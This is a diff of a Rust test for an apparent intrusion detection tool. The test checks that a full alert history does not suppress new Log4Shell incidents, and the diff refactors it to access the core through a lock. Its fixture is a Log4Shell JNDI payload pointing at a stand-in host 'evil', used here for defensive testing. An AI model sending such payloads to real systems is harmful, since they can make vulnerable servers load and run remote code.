@@ -11,22 +11,24 @@ fn saturated_ids_history_does_not_suppress_new_critical_incidents() {
     let mut app = App::new_for_test();
     let payload = b"GET /${jndi:ldap://evil/x} HTTP/1.1\r\nHost: example\r\n\r\n";
     for no in 1..=1000 {
-        app.core.security.update(&packets::tcp(no, 1, 0x18, payload));
+        app.configure_core(move |core| core.security.update(&packets::tcp(no, 1, 0x18, payload)));
     }
-    assert_eq!(app.core.security.ids_alerts.len(), 1000);
+    assert_eq!(app.core.read().unwrap().security.ids_alerts.len(), 1000);
     for no in 1001..=1002 {
         app.inject_packet(packets::tcp(no, 1, 0x18, payload));
     }
-    assert_eq!(app.core.security.ids_alerts.len(), 1000);
+    assert_eq!(app.core.read().unwrap().security.ids_alerts.len(), 1000);
     assert!(app.alert_overlay_open);
-    let alert = app.core.alert_center
+    let core = app.core.read().unwrap();
+    let alert = core
+        .alert_center
         .items
         .iter()
         .find(|item| item.source == "IDS" && item.title.contains("Log4Shell"))
         .unwrap();
     assert_eq!(alert.hit_count, 2);
     assert_eq!(alert.last_packet, 1002);
-    assert_eq!(app.core.incidents.active().unwrap().last_packet, 1002);
+    assert_eq!(core.incidents.active().unwrap().last_packet, 1002);
 }
 
 #[test]
